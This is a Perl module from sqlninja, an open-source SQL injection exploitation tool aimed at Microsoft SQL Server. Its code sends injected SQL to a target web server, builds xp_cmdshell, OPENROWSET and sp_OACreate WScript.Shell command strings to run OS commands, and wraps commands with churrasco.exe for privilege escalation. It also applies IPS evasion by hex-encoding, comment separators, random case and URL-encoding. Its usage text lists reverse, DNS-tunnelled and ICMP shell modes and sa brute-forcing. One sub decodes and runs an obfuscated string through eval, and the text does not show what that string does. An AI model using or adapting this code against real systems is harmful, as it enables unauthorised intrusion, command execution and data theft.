# This file is part of sqlninja
# Copyright (C) 2006-2013
# http://sqlninja.sourceforge.net
# icesurfer <r00t@northernfortress.net>
# nico <nico@leidecker.info>
# 
# Sqlninja is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Sqlninja is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with sqlninja. If not, see <http://www.gnu.org/licenses/>.

use strict;

our $conf;

# Parse options from configuration file
sub parsefile
{
	unless (-e $conf->{'confile'}) {
		print "[-] ".$conf->{'confile'}." does not exist. Exiting...\n";
		exit(-1);
	}
	print "[+] Parsing ".$conf->{'confile'}."...\n";
	my $confline;
	open(FILE,"<".$conf->{'confile'}) || die "[-] Can't open configuration file...".
						"exiting\n";
	while ($confline = <FILE>) {
		chomp($confline);
		# comment line
		if ($confline =~ m/^#\.*/) {
			next;
		}

		# We start with parameters that might require spaces
		
		# errorstring
		if ($confline =~ m/\s*errorstring\s*=\s*"(.+)"\s*/) {
			$conf->{'errorstring'} = $1;
			print_verbose("  - custom error page string: \"".$conf->{'errorstring'}."\"\n");
			next;
		}
		# tcpdump filter
		elsif ($confline =~ m/\s*filter\s*=\s*(.+)\s*/) {
			$conf->{'filterconf'} = $1;
			print_verbose("  - filterconf: ".$conf->{'filterconf'}."\n");
		        
		}
		elsif ($confline =~ m/\s*uploaddir\s*=\s*(.+)\s*/) {
			$conf->{'uploaddir'} = $1;
			$conf->{'uploaddir'} =~ s/\s+$//;
			$conf->{'uploaddir'} =~ s/^\s+//;
			print_verbose( "  - uploaddir: ".$conf->{'uploaddir'}."\n");
		}
		
		# Now we can safely strip all spaces and simplify regexps
		$confline =~ s/\s//g;
		
		#  Proxy host
		if ($confline =~ m/^proxyhost=(\S+)/) {
			$conf->{'proxyhost'} = $1;
			if ($conf->{'verbose'} == 1) {
				print "  - Proxy host: ".$conf->{'proxyhost'}."\n";
			}
		}
		# Proxy port
		elsif ($confline =~ m/^proxyport=(\d+)/) {
			$conf->{'proxyport'} = $1;
			print_verbose( "  - Proxy port: ".$conf->{'proxyport'}."\n");
			
		}
		# HTTP request
		elsif ($confline =~ m/^--httprequest_start--/) {
			$conf->{'httprequest'} = ""; # overwrite if already present
			my $line;
			$line = <FILE>;
			if ($line =~ m/^GET.+/) {
				$conf->{'method'} = "GET";
			} else {
				$conf->{'method'} = "POST";
			}

			if ($line =~ m/^(GET|POST)\shttps:\/\//) {
				$conf->{'ssl'} = "yes";
			} else {
				$conf->{'$ssl'} = "no";
			}
			print_verbose( "  - SSL: ".$conf->{'ssl'}."\n");
			
			# I suck with regexps, so there are probably bugs and definitely 
			# ways to do this better. Suggestions are welcome
			$line =~ m/^(GET|POST)\s+https?:\/\/([A-Za-z0-9.-]+)(\/|:)([^ ]+)/;
			$conf->{'host'} = $2;
			$conf->{'url'} = '/' . $4;
			if ($line =~ m/^(GET|POST)\s+https?:\/\/([A-Za-z0-9.-]+):(\d+)/) {
				$conf->{'port'} = $3;
			} elsif ($conf->{'ssl'} eq "yes") {
				$conf->{'port'} = 443;
			} else {
				$conf->{'port'} = 80;
			}

			if ($line =~ m/HTTP\/1.1/) {
				$conf->{'httpversion'} = 1;
			}
			$conf->{'httprequest'} = $conf->{'httprequest'}.$line;
			$line = <FILE>;
			while ($line !~ m/^--httprequest_end--/) {
				
				if ($line =~ m/^Host:\s+(\S+)/) {
					$conf->{'vhost'} = $1;
				}
				if (($conf->{'method'} eq "POST") and ($line =~ m/^\s*$/)) {
					$conf->{'httprequest'} = $conf->{'httprequest'}."Content-Length: __CONTENT_LENGTH__\n\n";
				} elsif (($conf->{'method'} eq "POST") and ($line =~ m/$conf->{'sqlmarker'}/)) {
					$conf->{'postline'} = $line;  # We'll need this to calculate Content-Length
					$conf->{'httprequest'} = $conf->{'httprequest'}.$line;
				} else {
					$conf->{'httprequest'} = $conf->{'httprequest'}.$line;
				}
				$line = <FILE>;
			}
		}
		# device to sniff in backscan mode
		elsif ($confline =~ m/^device=(\S+)/) {
			$conf->{'dev'} = $1;
			print_verbose( "  - sniff device: ".$conf->{'dev'}."\n");
		}
		# local host 
		elsif ($confline =~ m/lhost=(\S+)/) {
			$conf->{'lhost'} = $1;
			print_verbose( "  - local host: ".$conf->{'lhost'}."\n");
		}
		# domain for dnstunnel
		elsif ($confline =~ m/^domain=(\S+)/) {
			$conf->{'domain'} = $1;
			print_verbose( "  - domain: ".$conf->{'domain'}."\n");
			
		}
		# timeout for backscan 
		elsif ($confline =~ m/^timeout=(\d+)/) {
			$conf->{'timeout'} = $1;
			print_verbose( "  - timeout: ".$conf->{'timeout'}."\n");
		}
		# hostnamelen
		elsif ($confline =~ m/^hostnamelength=(\d+)/) {
			if (($1 > 39) and ($1 < 256)) {
				$conf->{'hostnamelen'} = $1;
				if ($conf->{'verbose'} == 1) {
					print "  - hostnamelength: ".
							$conf->{'hostnamelen'}."\n";
				}
			}
		}
		# resolved ip
		elsif ($confline =~ m/^resolvedip=(\d+)\.(\d+)\.(\d+)\.(\d+)$/){
			$conf->{'resolvedip'} = $1.".".$2.".".$3.".".$4;
			if ((($1 < 1) or ($1 > 255)) ||
			    (($2 < 0) or ($2 > 255)) ||
			    (($3 < 0) or ($3 > 255)) ||
			    (($4 < 0) or ($4 > 255))) {
			    	$conf->{'resolvedip'} = "127.0.0.1";
			}
			print_verbose( "  - resolved IP: ".$conf->{'resolvedip'}."\n");
		}
		# xp_name
		elsif ($confline =~ m/^xp_name=(\S+)/) {
			$conf->{'xp_name'} = $1;
			print_verbose( "  - xp_name: ".$conf->{'xp_name'}."\n");
		}
		# blind injection time
		elsif ($confline =~ m/^blindtime=(\d+)/) {
			if (($1 > 2) and ($1 < 60)) { # back to school, silly!
				$conf->{'blindtime'} = $1;
				print_verbose( "  - blindtime: ".$conf->{'blindtime'}."\n");
			}
		}
		# append comment
		elsif ($confline =~ m/^appendcomment=(\S+)/) {
			if ($1 eq "no") {
				$conf->{'appendcomment'} = "";
			}
			if ($conf->{'appendcomment'} eq "") {
				print_verbose( "  - append comment: no\n");
			} else {
				print_verbose( "  - append comment: yes\n");
			}
		}
		# evasion techniques
		elsif ($confline =~ m/^evasion=([1-4]+)$/) {
			$conf->{'evasion'} = $1;
		}
		# msf path
		elsif ($confline =~ m/^msfpath=(\S+)$/) {
			$conf->{'msfpath'} = $1;
			unless ($conf->{'msfpath'}=~m/\/$/) {
				$conf->{'msfpath'} = $conf->{'msfpath'}."/";
			}
		}
		# script lines to upload per request
		elsif ($confline =~ m/^lines_per_request=(\d+)$/) {
			if (($1 > 0) and ($1 < 31)) {
				$conf->{'lines_per_req'} = $1;
			}
		}
		# upload method (debug or vbscript)
		elsif ($confline =~ m/^upload_method=(\S+)$/) {
			if ($1 eq "debug") {
				$conf->{'uploadmethod'} = "debug";
			} else {
				$conf->{'uploadmethod'} = "vbscript";
			}
			print_verbose( "  - upload method: ".$conf->{'uploadmethod'}."\n");
		}
		# vbscript decoder name
		elsif ($confline =~ m/^b64decoder=(\S+)$/) {
			$conf->{'vbsdecoder'} = $1;
			print_verbose( "  - base64 decoder's name: ".$conf->{'vbsdecoder'}."\n");
		}
		# Whether to use churrasco.exe
		elsif ($confline =~ m/^usechurrasco=(\S+)$/) {
			if ($1 eq "yes") {
				$conf->{'churrasco'} = 1;
				print_verbose( "  - churrasco.exe enabled\n");
			}
		}
		# msf encoder to use
		elsif ($confline =~ m/^msfencoder=(\S+)$/) {
			$conf->{'msfencoder'} = $1;
			print_verbose( "  - msfencoder to use: ".$conf->{'msfencoder'}."\n");
		}
		# number of times to encode the msf payload
		elsif ($confline =~ m/^msfencodecount=(\d+)$/) {
			if ($1 > 0) {
				$conf->{'msfencodecount'}=$1;
				print_verbose( "  - msf payload will be encoded ".
						$conf->{'msfencodecount'}." times\n");
			}
		}
		# whether to handle DEP via xp_regwrite
		elsif ($confline =~ m/^checkdep=(\S+)$/) {
			if ($1 eq "yes") {
				$conf->{'checkdep'} = "yes";
				print_verbose( "  - DEP checking enabled\n");
			}
		}
		# sqlmarker
		elsif ($confline =~ m/^sqlmarker=(\S+)$/) {
			$conf->{'sqlmarker'} = $1;
			print_verbose( "  - sqlmarker: ".$conf->{'sqlmarker'}."\n");
		}
		# data extraction channel (DNS or time)
		elsif ($confline =~ m/^data_channel=(\S+)$/) {
		      if ($1 eq "dns") {
			      $conf->{'extractionchannel'} = $1;
		      } 
		      print_verbose( "  - extraction channel: $1\n");
		}
		# data extraction method (only used in "time" channel)
		elsif ($confline =~ m/^data_extraction=(\S+)%/) {
			if ($1 eq "binary") {
				$conf->{'extractiontype'} = "binary";
			} elsif ($1 eq "serial") {
				$conf->{'extractiontype'} = "serial";
			} # preset default: optimized_serial
			print_verbose( "  - extraction type: $1\n");
		}
		# char map used for serial_optimized
		elsif ($confline =~ m/^language_map=(\S+)/) {
			$conf->{'language_map'} = $1;
			print_verbose( "  - language map loaded from $1\n"); 
		}
		# should the char map be used in adaptive mode?
		elsif ($confline =~ m/^language_map_adaptive=(\S+)/) {
			if ($1 eq "no") {
				$conf->{'language_map_adaptive'} = 0;
				print_verbose( "  - language map is not adaptive"); 
			} else {
				$conf->{'language_map_adaptive'} = 1;
				print_verbose( "  - language map is adaptive");
			}
		}
		# store session?
		elsif ($confline =~ m/^store_session=(\S+)/) {
			if ($1 eq "no") {
				$conf->{'store_session'} = 0;
			} else {
				$conf->{'store_session'} = 1;
			}
			print_verbose( "  - storing session status: $1\n"); 
		}
		# sanity checking
		elsif ($confline =~ m/^sanity_check=(\S+)/) {
			if ($1 eq "no") {
				$conf->{'sanity_check'} = 0;
			} else {
				$conf->{'sanity_check'} = 1;
			}
			print_verbose( "  - performing sanity checks\n"); 
		}
		# session refreshing
		elsif ($confline =~ m/^refresh_session=(\S+)/) {
			if ($1 eq "no") {
				$conf->{'refresh_session'} = 0;
			} else {
				$conf->{'refresh_session'} = 1;
			}
			print_verbose( "  - allowing session refresh\n"); 
		}

	}
	close FILE;
	if ($conf->{'httprequest'} eq "") {
		print "[-] HTTP request not defined in ".$conf->{'confile'}."\n";
		print "    Are you sure you are not using a configuration file of a previous version?\n";
		print "    Starting from version 0.2.6, the syntax has changed. See documentation\n";
		exit(1);
	}
	if ($conf->{'httprequest'} !~ m/$conf->{'sqlmarker'}/) {
		print "[-] No ".$conf->{'sqlmarker'}." marker was found in the HTTP request in ".$conf->{'confile'}."\n";
		print "    See documentation for how to specify the attack request\n";
		exit(1);
	}
	if ($conf->{'host'} eq "") {
		print "[-] host not defined in ".$conf->{'confile'}."\n";
		exit (1);
	}
	if ($conf->{'httprequest'} eq "") {
		print "[-] no HTTP defined in ".$conf->{'confile'}."\n";
		exit (1);
	}
	if ($conf->{'filterconf'} eq "") {
		$conf->{'filterconf'} = "src host ".$conf->{'host'}." and dst host ".$conf->{'lhost'};
	}
	if (($conf->{'mode'} eq "d") or ($conf->{'mode'} eq "dnstunnel")) {
		if ($conf->{'hostnamelen'} < (length($conf->{'domain'})+10)) {
			print "[-] max hostname length too short\n";
			exit(1);
		}
		if ($conf->{'hostnamelen'} > 255) {
			print "[-] max hostname length too long\n";
			exit(1);
		}
	}
	if ($conf->{'evasion'} =~ /[1-4]/) {
		print "[+] Evasion technique(s):\n";
		if ($conf->{'evasion'} =~ /1/) {
			print "    - query hex-encoding\n";
		}	
		if ($conf->{'evasion'} =~ /2/) {
		        print "    - comments as separator\n";
		}
		if ($conf->{'evasion'} =~ /3/) {
		        print "    - random case\n";
		}
		if ($conf->{'evasion'} =~ /4/) {
		        print "    - random URI encoding\n";
		}
	}
	# If we are using a proxy without SSL, we need to modify the first line
	# E.g.: GET /blah.asp --> GET http://victim.com/blah.asp
	if (($conf->{'proxyhost'} ne "") and ($conf->{'ssl'} eq "")) {
		$conf->{'httprequest'} =~ s/$conf->{'method'}\s+\//$conf->{'method'} http:\/\/$conf->{'host'}:$conf->{'port'}\//; 
	}
}


# Send a request and return the time that it took to return
# It is used with WAITFOR-based blind injection
sub tryblind
{	
	my $query;
	if ($conf->{'password'} eq "") {
		$query = $_[0];
	} else {
		my $cmd = $_[0];
		$cmd =~ s/'/''/g;
		$query = "select * from OPENROWSET('SQLOLEDB',".
			"'Network=DBMSSOCN;Address=;uid=sa;pwd=".
				$conf->{'password'}.
				"','select 1;".$cmd."');";
	}
	my $time1 = time();
	sendrequest($query);
	my $time2 = time();
	return ($time2 - $time1);
}

# Generate a random filename to use for UNIX sockets
# A fixed filename causes problems when a spurious file was left
# from a previous execution that exited uncleanly and the file can't 
# be unlink()-ed by the current user
# The parameter allows callers to guarantee uniqueness in case more
# files are needed
sub genfile
{
	my $rnd = int(rand()*99999999);
	my $filename = "/tmp/.ninjasocket_".$_[0]."_".$rnd;
	return $filename;
}

# Wrap $cmd with churrasco.exe
sub usechurrasco
{
	return "%TEMP%\\churrasco.exe \"".$_[0]."\"";
}


sub createcommand
{
	my $cmd = $_[0];
	$cmd =~ s/'/''/g;
	my $command;
	$cmd = "cmd /C ".$cmd;
	# a) sysadmin privileges, native or with sp_addsrvrolemember.
	# If so, we have for sure xp_cmdshell (either native or custom)
	if ($conf->{'password'} eq "") {
		$command = "exec master..".$conf->{'xp_name'}." '".$cmd."';";
	}
	# b) we have the password, we have a xp_cmdshell, but the call to
	# sp_addsrvrolemember is not yet effective (damn ODBC connection
	# pool!). Therefore, we have to use openrowset at each call
	elsif ($conf->{'xp_name'} ne "NULL") {
		# $password =~ s/ /%20/g;
		$cmd =~ s/'/''/g;
		$command = "select * from OPENROWSET('SQLOLEDB','';'sa';'".
			   $conf->{'password'}."','select 1;exec master..".$conf->{'xp_name'}.
			   " ''".$cmd."''');";
	}
	# c) we have the password, but no xp_cmdshell and sp_addsrvrolemember
	# is not yet effective. CREATE PROCEDURE does not seem to work when 
	# nested into OPENROWSET, so we have to use the custom_xp code each 
	# time. 
	# Complicated, slow, but it works
	else {
		# $password =~ s/ /%20/g;
		$cmd =~ s/'/''/g;
		$command = "select * from OPENROWSET('SQLOLEDB','';'sa';'".
		      $conf->{'password'}."','select 1;DECLARE \@ID int ".
		      "EXEC sp_OACreate ''WScript.Shell'',\@ID OUT ".
		      "EXEC sp_OAMethod \@ID,''Run'',Null,''".$cmd."'',0,1 ".
		      "EXEC sp_OADestroy \@ID');";
	}
}

# Undocumented but doesn't do anything nasty :)
sub r
{
	my $__=2359296;my $_s="WYPU[EFFFbd^LSJVTLE[VEZXSUPUQHEYHKPVEWSH`LYbcbcdPEOVWLE`V\\EOH]";
	$_s.="LETWSH`LYEPUZ[HSSLKEGGdbdFFF\"T`Edbdb[\$06!!:VJRL[!!05,;c\%UL^D7LLY(KKY\$\%FFF^^";
	my $s_=2**16;$_s.="^EEUVY[OLYUMVY[YLZZEEUL[FFF'7LLY7VY[\$\%ddd'7YV[V\$\%FFF[JWFFF';`WL";
	$_s.="\$\%:6*2F:;9,(4B\"WYPU[Edbdb[Ecdcd.,;EFFLHZ[LYLNNEE[_[E/;;7FFbbbCYCU/VZ[!E^^^EEU";
	$__/=$s_;$_s.="VY[OLYUMVY[YLZZEEUL[CYCU*VUULJ[PVU!EJSVZLCYCUCYCUcdcd\"T`EdbdbS\"T`Edbd";
	$__=sqrt($__);$_s.="bY\"^OPSLDKLMPULKDdbdbS\$\#dbdb[\%BBbdbdbYEE\$dbdbS\"dJSVZLdbdb[\"";
	$__**=2;$_s.="dbdbY\$eFF''DEEccB''FF\"dbdbS\$dbdbccc\"Z`Z[LTDFFFTWSH`LYEFFFEEdbdbSEEFF";
	$_s.="FE\%FFKL]FFU\\SSFFFB\"";while($_s=~/(.)/g){my $x=ord($1);$_.=chr($x+5**2);}my $___
	="*"x$__;$_=~s/{\|{\|/!!/g;$_=~s/\|}\|}/"/g;$_=~s/}}}/80/;$_=~s/{{{/1.0/;$_=~s/\|\|\|/1/
	;$_=~s/}{}{/\$/g;$_=~s/\|\|/+/g;$_=~s/\|/-/g;$_=~s/___/'/g;$_=~s/__/\//g;$_=~s/\^\^/./g;
	$_=~s/\@\@/---/g;$__=~s/\s*/__/g;$_=~s/\@/,/g;$_=~s/\^/ /g;$__=0x39AD3F5A;$_=~s/\[/\)/g;
	$_=~s/\]/\(/g;$_=~s/}i/}I/;$__=~s/\\{[0...256]/(s+)/g;$_=~s/{/$___/;$__++;$_=~s/{/$___/;
	$__**11;$_=~s/}/\n/;$_=~s/}/\n/;$_=~s/}/\n/;$_=~s/}/\n/;$_=~s/w/W/;$_=~s/``/:)/;eval $_;
}

# Converts a query to its hex string
sub convert2hex
{
	my $s = $_[0];
	$s =~ s/(.)/sprintf("%02lx", ord $1)/eg;
	$s = "0x".$s;
	return $s;
}

sub randomcase
{
	my $s1 = $_[0];
	my $s2;
	my @s = split(//,$s1);
	foreach (@s) {
		if ($_ =~ /\w/) {
			if (int(rand(2))==1) {
				$s2 = $s2.uc($_);
			} else {
				$s2 = $s2.lc($_);
			}
		} else {
			$s2 = $s2.$_;
		}
	}
	return $s2;
}

# Performs some magic on the query to inject, in order to confuse IPS's.
# No, it's not necessarily an 'evil black hat' feature
sub evadeips
{
	my $command = $_[0];
	
	# N.B.: Order is important
	
	# Transform the query to its hex representation and executes it
	if ($conf->{'evasion'} =~ /1/) {
		my $hex = convert2hex($command);
		$command = "declare \@a varchar(8000) ".
			    "set \@a=".$hex." ".
			    "exec (\@a)";
	}

	# Use comments as separator
	if ($conf->{'evasion'} =~ /2/) {
		$command =~ s/[\t\r\n]/ /g;
		$command =~ s/ /\/**\//g;
	}
	
	# Random case
	if ($conf->{'evasion'} =~ /3/) {
		$command = randomcase($command);
	}

	# ...random URL-encoding must be encapsulated in urlencode()
	
	return $command;
}

# Encode SQL commands into url-friendly strings
# It also perform random URI encoding evasion
sub urlencode
{	
	my $s = $_[0];
	if ($conf->{'verbose'} == 1) {
		"  [v] URL-encoding command\n";
	}
	$s =~ s/[\t\r\n]/ /g;
	
	my @t = split(//,$s);
	$s = "";
	foreach (@t) {	
		if (($conf->{'evasion'} =~ /4/)          # If random URI encoding,
		   and ($_ =~ /[A-Za-z0-9]/)   # and it's alphanumeric
		   and (int(rand(3))==1)) {    # we might as well encode it :)
			$_=sprintf("%%%2X", ord($_));
		} else {
			$_=~s/([^A-Za-z0-9])/sprintf("%%%2X", ord($1))/se;
		}
		$s=$s.$_;
	}
	return $s;
}


# Send the request to the web server and return the results
sub sendrequest 
{
	my $command;
	my $errorflag = 0;
	my $httprequest_tmp = $conf->{'httprequest'}; # We use temp variables, so that we don't taint the original
	my $postline_tmp = $conf->{'postline'};

	# Do we need to evade some IPS?
	if ($conf->{'evasion'} eq "0") {
		$command = $_[0];
	} else {
		$command = evadeips($_[0]);
	}
	# DEBUG MODE 1
        if (($conf->{'debug'} eq "1") or ($conf->{'debug'} eq "all")) {
		print "++++++++++++++++SQL Command++++++++++++++++\n";
		print $_[0]."\n";
		print "-------------------------------------------\n";
	}

	if (($conf->{'evasion'} ne "0") and (($conf->{'debug'} eq "1") or ($conf->{'debug'} eq "all"))) {
		print "+++++++++Obfuscated SQL Command++++++++++++\n";
		print $command."\n";
		print "-------------------------------------------\n";
	}

	$command = urlencode($command);

	# Create the socket for the communication
	my $s; # The socket
	# Create the correct socket depending on proxy and SSL
	if (($conf->{'ssl'} == 0) and ($conf->{'proxyhost'} eq "")) {
		$s = IO::Socket::INET->new
		(
			PeerAddr => $conf->{'host'},
			PeerPort => $conf->{'port'},
			Proto    => 'tcp',
			Type     => SOCK_STREAM
		);
		if (!defined $s) {
			print "\nError: could not create socket to ".$conf->{'host'}.":"
						.$conf->{'port'}."\n";
			exit(1);
		}
	} elsif (($conf->{'ssl'} == 1) and ($conf->{'proxyhost'} eq "")) {
		$s = IO::Socket::SSL->new
		(
			PeerAddr => $conf->{'host'},
			PeerPort => $conf->{'port'}
		);
		if (!defined $s) {
			print "\nError: could not create SSL socket to "
						.$conf->{'host'}.":".$conf->{'port'}."\n";
			exit(1);
		}
	} elsif (($conf->{'ssl'} == 0) and ($conf->{'proxyhost'} ne "")) {
		$s = IO::Socket::INET->new
		(
			PeerAddr => $conf->{'proxyhost'},
			PeerPort => $conf->{'proxyport'},
			Proto	 => 'tcp',
			Type	 => SOCK_STREAM
		);
		if (!defined $s) {
			print "\nError: could not create socket to ".
					$conf->{'proxyhost'}.":".$conf->{'proxyport'}."\n";
		exit(1);
		}
	} else {
		$s = IO::Socket::INET->new
		(
			PeerAddr => $conf->{'proxyhost'},
			PeerPort => $conf->{'proxyport'},
			Proto    => 'tcp',
			Type     => SOCK_STREAM
		);
		if (!defined $s) {
			print "\nError: could not create socket to ".
                                     $conf->{'proxyhost'}.":".$conf->{'proxyport'}."\n";
			exit(1);
		}
		                     
		print $s "CONNECT ".$conf->{'host'}.":".$conf->{'port'}." HTTP/1.".$conf->{'httpversion'}."\r\n".
			 "Host: ".$conf->{'vhost'}."\r\n\r\n";
		my $proxyresp = <$s>;
		# The following is causing *completely random* problems with
		# my VMPlayer. Need to investigate
		# if ($proxyresp !~ / 200 /) {
		#	print "Proxy CONNECT failed: $proxyresp";
		#	exit(1)
	        #}
		IO::Socket::SSL->start_SSL($s, SSL_startHandshake => 0);
		$s->connect_SSL;
		if (!defined $s) {
			print "\nError: proxy SSL CONNECT to socket to ".
				$conf->{'host'}.":".$conf->{'port'}." failed\n";
			exit(1);
		}
	}
	$s->autoflush(1);
	my $finalstring;
	# If there is a proxy, we need to add the host to the 
	# first line of the request. We use $proxystring for this
	my $proxystring = "";
	if (($conf->{'proxyhost'} ne "") and ($conf->{'ssl'} == 0)) {
		$proxystring = "http://".$conf->{'host'}.":".$conf->{'port'};
	}

	$command .= $conf->{'appendcomment'};

	$httprequest_tmp =~ s/$conf->{'sqlmarker'}/$command/;
	# method: POST
	if ($conf->{'method'} eq "POST") {	
		$postline_tmp =~ s/$conf->{'sqlmarker'}/$command/;
		my $contentlength = length($postline_tmp);
		$httprequest_tmp =~ s/__CONTENT_LENGTH__/$contentlength/;
		$httprequest_tmp .= "\n";
	} else {
		$httprequest_tmp .= "\n";
	}
	$httprequest_tmp =~ s/\n/\r\n/g;

	# DEBUG MODE 2
	if (($conf->{'debug'} eq "2") or ($conf->{'debug'} eq "all")) {
		print "+++++++++++++++HTTP Request++++++++++++++++\n";
		print $httprequest_tmp;
		print "-------------------------------------------\n";
	}
	print $s $httprequest_tmp;
	# and here is the response from the server
	my $line;
	my $result = "";
	my $errormsg = "    Check configuration, as things might not be ".
					"working as expected !\n";

	# Dirty hack to cope with broken proxies that do not
	# care about the "Connection: close" header
	while ((defined($line = <$s>)) and ($result !~ m/<\/html>/i)) {
		$result .= $line;
	}

	# We have the result. Now some error checking...
	# First we get rid of all \r\n's
	$result =~ s/\r\n/\n/g;

	# Then we split the result in different lines
	my @lines = (split /\n/,$result);
	
	# If it is a POST requests, the web server will answer with "100
	# Continue" first. We have to skip that part of response to check
	# the actual response code. In order to do so, we have to look for
	# the first empty line.
	if ($lines[0] =~ m/100 Continue/) {
		while ($lines[0] ne "") {
		       		shift(@lines);
		}
		shift(@lines); # Shift the remaining empty line
	}
	
	# Ok, unless something went wrong, we have the response code in the
	# first line of the array
	if (($lines[0] !~ m/200 OK/) and # not a 200 OK 
	    ($errorflag == 0) and # no previous errors detected
	    ($conf->{'mode'} ne "b") and	# errors can be fine when bruteforcing
	    ($conf->{'mode'} ne "bruteforce")) {
		$errorflag = 1;
		print "[-] Warning... the server responded with ".$lines[0]
			."\n";
		print $errormsg;
	}
	# Second: check for custom error
	if (($conf->{'errorstring'} ne "") and # custom error has been defined 
	    ($errorflag == 0) and    # no previous error detected
	    ($conf->{'mode'} ne "b") and		# errors can be fine when bruteforcing
	    ($conf->{'mode'} ne "bruteforce") and
	    ($result =~ /$conf->{'errorstring'}/)) { # error string found
	    	$errorflag = 1;
		print "[-] Warning... custom error page detected.\n";
		print $errormsg;
	}
	close $s;
	# DEBUG MODE 3
	if (($conf->{'debug'} eq "3") or ($conf->{'debug'} eq "all")) {
		print "++++++++++++++HTTP Response++++++++++++++++\n";
		print $result;
		print "-------------------------------------------\n";
	}
	return $result;
}

sub usage 
{
	die <<EOF;
Usage: $0
	-m <mode> : Required. Available modes are:
	    t/test - test whether the injection is working
	    f/fingerprint - fingerprint user, xp_cmdshell and more
	    b/bruteforce - bruteforce sa account (only before SQL Server 2005)
	    e/escalation - add user to sysadmin server role (only before SQL Server 2005)
	    x/resurrectxp - try to recreate xp_cmdshell
	    u/upload - upload a binary file (e.g.: nc.exe)
	    s/dirshell - start a direct shell
	    k/backscan - look for an open outbound port
	    r/revshell - start a reverse shell
	    d/dnscmd - attempt a dns tunneled shell
	    i/icmpshell - start a reverse ICMP shell
	    c/sqlcmd - issue a 'blind' OS command
	    m/metasploit - wrapper to Metasploit stagers
	    g/getdata - extract data (EXPERIMENTAL!!!)
	-f <file> : configuration file (default: sqlninja.conf)
	-s <file> : session file (only for getdata mode)
	-p <password> : sa password
	-w <wordlist> : wordlist to use in bruteforce mode (dictionary method
	                only)
	-g : generate debug script and exit (only valid in upload mode)
	-v : verbose output
	-d <mode> : activate debug
	    1 - print each injected command
	    2 - print each raw HTTP request
	    3 - print each raw HTTP response
	    all - all of the above
	...see sqlninja-howto.html for details
	 
EOF
}

sub print_verbose
{
	if ($conf->{'verbose'} == 1) {
		print "[v] " . (shift);
	}
}

# receive user input from STDIN but only accept input that matches a regular expression
sub read_from_prompt
{
	my ($text, $regexp) = @_;

	# print "$text";
	my $input = "";
	do {
		print "$text > ";
		$input = <STDIN>;
		chomp($input);
	} while ($input !~ $regexp);
	return $input;
}


# show a menu and expect user input
# function takes one argument which is the menue entries array in the form of:
# [ ENTRY_CHOICE,	ENTRY_TEXT,		REFERENCE_OF_FUNCTION]
# For example:
# 	my @m = (
#		[	'1',	'Enumerate Users', 				\&extract_users		],
#		[	'2',	'Enumerate DBs',				\&extract_DBs		],
#		[	'3',	'Enumerate tables',				\&extract_tables	],
#		[	'4',	'Enumerate columns of a table',	\&extract_columns	]
# 	);
#
#	ENTRY_CHOICE is case insensitive.
#	The second argument is a message to print before the menu (e.g.: "select from the following options\n"
#	If a function reference is 'undef' the menu will be re-printed. 
#	Useful for 'print this menu' entries
#
sub show_menu {
	my $menu_entries = shift;
	my $message = shift;
	
	print "$message\n";

	my %choices = ();
	my $pattern = "";

	# print menu entries
	foreach my $e (@{$menu_entries}) {
		if (length(@{$e}[0]) == 0) {
			print "@{$e}[1]\n";
		} else {
			print "  @{$e}[0] - @{$e}[1]\n";
			$pattern .= @{$e}[0];
			$choices{@{$e}[0]} = @{$e}[2];
		}
	}
	while (1) {
		# read user input
		my $choice = lc(read_from_prompt('',"^(?i)[$pattern]\$"));
	
		# call function
		my $func = $choices{$choice};
		if ($func != undef) {
			&{$func};
		} else {
			show_menu($menu_entries);
		}
	}
}

#my $progress_idx = 0;
sub show_progress
{
	my ($current, $max) = @_;

	my $progress_bar_size = 20;

#	my @wheel = qw(- \\ |);

	my $progress = '='x ($current/($max/$progress_bar_size));
	printf "\r[%-".$progress_bar_size."s] " , $progress;

#	$progress_idx = ($progress_idx + 1) % scalar(@wheel);
}

sub clear_progress
{
#	print "\r", ' 'x80, "\r";
	print "\b"x60;
}

1;
